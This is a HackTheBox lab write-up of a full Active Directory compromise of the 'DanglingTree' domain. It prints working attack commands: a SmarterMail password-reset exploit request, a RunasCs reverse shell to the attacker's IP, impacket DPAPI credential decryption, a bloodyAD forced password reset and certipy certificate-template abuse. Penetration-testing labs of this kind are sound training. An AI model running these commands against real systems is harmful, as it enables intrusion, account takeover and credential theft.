# HackTheBox DanglingTree Full Chain Penetration Testing

## External Reconnaissance and Initial Access

### Network Mapping

- `nmap` scan identified the target as `dc.danglingtree.htb`.
- Domain: `danglingtree.htb`
- Realm: `DANGLINGTREE.HTB`
- Current target IP: `10.129.141.92`
- Identified exposed services including SMB, LDAP, Kerberos, RDP, WinRM, Windows Admin Center and other Windows services.

### SMB Enumeration

- SMB share `IT` was discovered.
- File `\\IT\DanglingTree_RoE_Assessment.pdf` was obtained and used as the initial foothold / information source.

## Windows Admin Center Reconnaissance

### Account Discovery

- Account `anderson.w` was identified.
- Credentials:

  - Username: `anderson.w`
  - Password: `R3d***`

### Authorized Access

- `anderson.w` had permissions to log into the Windows Admin Center panel.
- Windows Admin Center was exposed on `https://dc.danglingtree.htb:6600`.

### Important Distinction

- The account permission allowed access to the WAC panel.
- The vulnerability was then used to achieve code execution through the already authorized account.

## Windows Admin Center RCE

### Vulnerability Analysis

Identified an outdated/vulnerable Windows Admin Center deployment.

### `CVE-2026-26119`

Exploiting the authenticated RCE vulnerability to execute PowerShell commands through WAC.

### Exploit

- Using a custom Python script to authenticate as `anderson.w` and execute PowerShell commands.

```bash
python3 wac_rce.py 'anderson.w' 'R3d***' "whoami /all"
```

Initial command execution was achieved as `danglingtree\anderson.w`.

## Reverse Shell and Shell Stabilization

### Reverse Shell

- Initial reverse shell was created using a PowerShell `System.Net.Sockets.TCPClient` payload.
- Payload connected back to Kali at `10.10.14.128:7777`.

### Quoting Issues

- Nested Bash -> Python -> JSON -> PowerShell quoting caused payload parsing issues.
- Payload was encoded using UTF-16LE + Base64 and executed with `PowerShell -EncodedCommand`.

### Shell Upgrade

- A Python HTTP server was used to host `Invoke-ConPtyShell.ps1`.
- `Invoke-ConPtyShell.ps1` was downloaded from the Kali server and executed on the target.
- The unstable TCP reverse shell was upgraded to a functional ConPtyShell.

### Result

Obtaining a stable interactive PowerShell session as `anderson.w`.

## Internal Service Enumeration

### Socket Enumeration

```powershell
netstat -ano | findstr LISTENING
```

### Local Services Identified

- `127.0.0.1:25`
- `127.0.0.1:110`
- `127.0.0.1:143`
- `127.0.0.1:587`
- `127.0.0.1:5222`
- `127.0.0.1:17017`
- `127.0.0.1:17017` was identified as SmarterMail.

- Later on, firewall inspection ensured the above ports were closed to the outside world.

### Windows Admin Center Internal Services

- `6601`
- `6602`

Both returned `Sub service process` when accessed locally and were identified as WAC internal services.

## Internal Network Enumeration and SmarterMail Reconnaissance

`SmarterMail` was identified on `127.0.0.1:17017`.

### Version

- Version: `100.0.9504`, Build: `9504`, Date: `Jan 8, 2026`

### Administrative Account

`svc_mail` had:

- `SysAdmin`
- `DomainAdmin`
- `PrimarySysAdmin`
- `CanImpersonate=True`
- `CanViewPasswords=True`

## SmarterMail Exploitation

### Vulnerability

`CVE-2026-23760`

### Password Reset

Exploiting `/api/v1/auth/force-reset-password`.

```bash
curl -s --socks5-hostname 127.0.0.1:1080 \
  -H 'Content-Type: application/json' \
  -d '{"IsSysAdmin":true,"OldPassword":"x","Username":"svc_mail","NewPassword":"Kwakwa5!","ConfirmPassword":"Kwakwa5!"}' \
  http://127.0.0.1:17017/api/v1/auth/force-reset-password
```

New credentials:

- Username: `svc_mail`

- Password: `Kwakwa5!`

- Authenticated to SmarterMail and obtained an administrative access token.

## SmarterMail Backup Enumeration

- Domain backup was identified at:

`C:\SmarterMail\Domains\danglingtree.htb.bak`

- Backup domain header:

`x-smartermaildomain: danglingtree.htb.bak`

### Accounts Discovered in the Backup

- `emma.s`

- `liam.m`

- `noah.b`

- `oliver.t`

- `sophia.k`

- `svc_mail`

- Impersonation enumeration revealed `noah.b@danglingtree.htb.bak`.

## SmarterMail Credential Extraction

- SmarterMail impersonation was used against the backup account `noah.b`.
- `show-password` functionality was used with the valid SmarterMail administrative token.

Recovered credentials:

`noah.b : RiverDragon#Storm25`

## Kerberos Authentication as `noah.b`

### TGT Request

```bash
impacket-getTGT \
  'DANGLINGTREE.HTB/noah.b:RiverDragon#Storm25' \
  -dc-ip 10.129.141.92
```

### Credential Cache

`noah.b.ccache`

```bash
export KRB5CCNAME=./noah.b.ccache
```

- Kerberos authentication was verified using `klist` and SMB authentication.

## Active Directory Enumeration

### Domain Users

- `anderson.w`
- `noah.b`
- `alex.o`
- `jake.h`
- `svc_mail`
- `Administrator`

### Important Groups

- `Helpdesk_Cert_Support`
- `Template_Editors`
- `DevOps_PKI`
- `support-it`

### Memberships

- `jake.h` -> `Helpdesk_Cert_Support`
- `jake.h` -> `Template_Editors`
- `jake.h` -> `DevOps_PKI`
- `alex.o` -> `support-it`

## Writable Object Enumeration

- `bloodyAD` was used to identify writable Active Directory objects.
- Most write permissions found on `noah.b` were normal self-write attributes.

Interesting additional permission:

`DC=_msdcs.danglingtree.htb` -> `dnsNode: CREATE_CHILD`, `dnsZoneScopeContainer: CREATE_CHILD`

- The DNS permission was enumerated but was not used in the final attack chain.

## Privilege Transition: `anderson.w` -> `noah.b`

- `runas`, `Start-Process -Credential`, `Start-Job -Credential` and `CreateProcessWithLogonW` were tested.
- These methods did not provide a practical interactive shell through the existing reverse shell.
- `RunasCs.exe` was used instead.
- `RunasCs.exe` was hosted on the Kali HTTP server and downloaded to `C:\Windows\Temp\RunasCs.exe`.

Listener:

```bash
nc -lvnp 6666
```

Execution:

```powershell
C:\Windows\Temp\RunasCs.exe noah.b "RiverDragon#Storm25" powershell.exe -d DANGLINGTREE -r 10.10.14.128:6666 -t 0
```

Result:

`danglingtree\noah.b`

- The resulting shell was upgraded again to ConPtyShell using `Invoke-ConPtyShell.ps1`.

## User Flag

- User shell was obtained as `danglingtree\noah.b`.
- `/home` equivalent Windows user profile enumeration was performed.
- User flag was successfully obtained.

## Windows Credential Manager

### Credential Enumeration

```powershell
cmdkey /list
```

Output indicated a stored domain credential:

```text
Target: Domain:target=PC01.danglingtree.htb
Type: Domain Password
User: alex.o
```

- This indicated that `noah.b` had a stored domain credential belonging to another user: `alex.o`.
- The password was not directly displayed by `cmdkey`.

## DPAPI Credential Recovery

- Windows Credential Manager stores secrets protected by DPAPI.
- The following DPAPI artifacts were identified in the `noah.b` profile:

### Credential Blob

`57FFB67D684C67F09E7153B9C7CC3940`

### DPAPI Master Key

`f53fcaba-f057-48e8-8f92-0180d274bf0f`

### SID

`S-1-5-21-4220238332-57023728-1129110646-1602`

- The Base64 data was decoded back to binary before using Impacket.

### Master Key Decryption

```bash
impacket-dpapi masterkey \
  -file ./masterkey.bin \
  -sid 'S-1-5-21-4220238332-57023728-1129110646-1602' \
  -password 'RiverDragon#Storm25'
```

### Credential Decryption

```bash
impacket-dpapi credential \
  -file ./credential.bin \
  -key "$(cat decrypted-key)"
```

Recovered credentials:

`alex.o : SunsetMountainPeak@2025`

## Kerberos Authentication as `alex.o`

### TGT Request

```bash
impacket-getTGT \
  'DANGLINGTREE.HTB/alex.o:SunsetMountainPeak@2025' \
  -dc-ip 10.129.141.92 \
  -save-as ./alex.o.ccache
```

### Credential Cache

`alex.o.ccache`

## BloodHound Enumeration

- BloodHound was used to enumerate AD relationships for `alex.o`.

BloodHound showed:

`alex.o` -> `ForceChangePassword` -> `jake.h`

- `ForceChangePassword` allowed changing Jake's password without knowing the previous password.

## Privilege Transition: `alex.o` -> `jake.h`

### Password Reset

```bash
bloodyAD -H "$DC_HOST" -i "$DC_IP" -d "$DOMAIN" \
  -u alex.o -k ccache="$KRB5CCNAME" \
  set password jake.h 'Kwakwa5!'
```

New credentials:

`jake.h : Kwakwa5!`

### TGT Request

```bash
impacket-getTGT \
  'DANGLINGTREE.HTB/jake.h:Kwakwa5!' \
  -dc-ip 10.129.141.92 \
  -save-as ./jake.h.ccache
```

```bash
export KRB5CCNAME=$PWD/jake.h.ccache
```

## AD CS Reconnaissance

`certipy` enumeration:

```bash
certipy-ad find \
  -u 'jake.h@danglingtree.htb' \
  -k -no-pass \
  -target "$DC_HOST" \
  -dc-ip "$DC_IP" \
  -stdout
```

### Certificate Authority

`danglingtree-DC-CA`

### CA Permissions

`Enroll`:

- `DANGLINGTREE.HTB\Authenticated Users`

`ManageCertificates`:

- `DANGLINGTREE.HTB\Helpdesk_Cert_Support`

`ManageCa`:

- `DANGLINGTREE.HTB\Domain Admins`

- `DANGLINGTREE.HTB\Enterprise Admins`

- `DANGLINGTREE.HTB\Administrators`

- Since `jake.h` belonged to `Helpdesk_Cert_Support`, he had `ManageCertificates`.

- Jake did not have `ManageCa`.

## Failed AD CS Path — SubCA / ESC7

The `SubCA` template had:

- `Client Authentication = True`

- `Enrollment Agent = True`

- `Any Purpose = True`

- `Enrollee Supplies Subject = True`

- Jake did not have Enrollment Rights on `SubCA`.

Certificate request:

```bash
certipy-ad req \
  -u 'jake.h@danglingtree.htb' \
  -k -no-pass \
  -target "$DC_HOST" \
  -dc-ip "$DC_IP" \
  -ca 'danglingtree-DC-CA' \
  -template 'SubCA' \
  -upn 'administrator@danglingtree.htb' \
  -sid 'S-1-5-21-4220238332-57023728-1129110646-500'
```

Result:

`Request ID: 17`

`CERTSRV_E_TEMPLATE_DENIED`

- Trying to issue request `17` using `ManageCertificates` resulted in `Access denied: Insufficient permissions to issue certificate`.

### Conclusion

- `ManageCertificates` is not equivalent to `ManageCa`.
- `SubCA` was not the correct escalation path.

## Dangling Certificate Templates

### CA Template Enumeration

```bash
certipy-ad ca \
  -u 'jake.h@danglingtree.htb' \
  -k -no-pass \
  -target "$DC_HOST" \
  -dc-ip "$DC_IP" \
  -ca 'danglingtree-DC-CA' \
  -list-templates
```

### CA Published Templates

- `RemoteAccessVPN`
- `EmployeeAuthTemplate`
- `VPNUserTemplate`
- `DirectoryEmailReplication`
- `DomainControllerAuthentication`
- `KerberosAuthentication`
- `EFSRecovery`
- `EFS`
- `DomainController`
- `WebServer`
- `Machine`
- `User`
- `SubCA`
- `Administrator`

Normal template enumeration did not show:

- `RemoteAccessVPN`
- `EmployeeAuthTemplate`
- `VPNUserTemplate`

### Conclusion

- CA still referenced these templates.
- Corresponding certificate template objects were missing from Active Directory.
- This created a dangling certificate template condition.

## Privilege Escalation: `jake.h` -> ESC4

- `jake.h` belonged to `Template_Editors`.
- Certificate templates are Active Directory objects stored below:

`CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=danglingtree,DC=htb`

- `jake.h` was able to create the missing `EmployeeAuthTemplate` object.

Created object:

`CN=EmployeeAuthTemplate,CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=danglingtree,DC=htb`

### Template Properties

- `objectClass: pKICertificateTemplate`
- `Client Authentication: True`
- `Enrollee Supplies Subject: True`
- `Schema Version: 2`
- `Minimum RSA Key Size: 2048`

Template owner:

`DANGLINGTREE.HTB\jake.h`

- Certipy detected: `ESC4: Template is owned by user.`

## GenericAll on `EmployeeAuthTemplate`

Full control was granted to `jake.h`:

```bash
bloodyAD -d danglingtree.htb \
  -u 'jake.h' \
  -k \
  -s \
  -H "$DC_HOST" \
  -i "$DC_IP" \
  add genericAll \
  'CN=EmployeeAuthTemplate,CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=danglingtree,DC=htb' \
  'jake.h'
```

Result:

`jake.h has now GenericAll on EmployeeAuthTemplate`

- `GenericAll` provided full control over the template object.

## ESC1 Configuration

Re-enumeration showed:

### Full Control Principals

- `DANGLINGTREE.HTB\Domain Admins`
- `DANGLINGTREE.HTB\jake.h`
- `DANGLINGTREE.HTB\Local System`
- `DANGLINGTREE.HTB\Enterprise Admins`

Jake was now an Enrollable Principal:
`DANGLINGTREE.HTB\jake.h`

Certipy detected:
- `ESC1`
- `ESC4`

### ESC1 Conditions

- `Enrollee Supplies Subject = True`
- `Client Authentication = True`
- `jake.h` had Enrollment Rights.

## Administrator Certificate Request

Built-in Administrator RID: `500`

## Final objective fulfilled
Successfully extracted `C:\Users\Administrator\Desktop\root.txt`
